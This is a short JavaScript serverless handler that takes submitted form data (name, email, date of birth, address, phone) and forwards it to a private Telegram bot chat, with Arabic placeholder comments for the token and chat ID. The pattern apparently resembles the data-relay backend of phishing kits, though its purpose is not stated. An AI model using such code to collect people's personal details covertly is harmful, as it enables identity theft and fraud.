import fetch from "node-fetch";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const { first_name, last_name, email, dob, address, postal, city, num } = req.body;

  const BOT_TOKEN = "هنا تحط Token ديال البوت ديالك";
  const CHAT_ID = "هنا تحط Chat ID ديالك";

  const message = `
📨 بيانات جديدة:
- الاسم: ${first_name} ${last_name}
- البريد: ${email}
- تاريخ الميلاد: ${dob}
- العنوان: ${address}, ${city}, ${postal}
- رقم الهاتف: ${num}
  `;

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
    });

    res.status(200).json({ message: "تم الإرسال بنجاح!" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "خطأ أثناء الإرسال" });
  }
}
